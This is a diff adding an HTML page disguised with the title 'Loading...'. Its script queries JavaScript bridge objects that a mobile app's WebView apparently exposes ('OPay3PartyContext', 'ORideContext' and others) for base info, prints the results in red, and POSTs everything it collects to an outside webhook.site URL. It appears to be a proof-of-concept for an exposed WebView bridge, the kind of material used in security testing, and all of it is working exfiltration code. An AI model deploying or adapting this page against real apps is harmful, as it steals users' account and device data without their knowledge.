@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<div id="output"></div>
+<script>
+var bridges = ['control', 'history', 'OPay3PartyContext', 'ORideContext'];
+var results = [];
+
+bridges.forEach(function(bridge) {
+  try {
+    var data = JSON.parse(window[bridge].getBaseInfo());
+    results.push({bridge: bridge, data: data});
+    var el = document.createElement('pre');
+    el.style.color = 'red';
+    el.textContent = bridge + '.getBaseInfo() = ' + JSON.stringify(data, null, 2);
+    document.getElementById('output').appendChild(el);
+  } catch(e) {}
+});
+
+if (results.length > 0) {
+  fetch('https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(results)
+  });
+}
+</script>
+</body>
+</html>
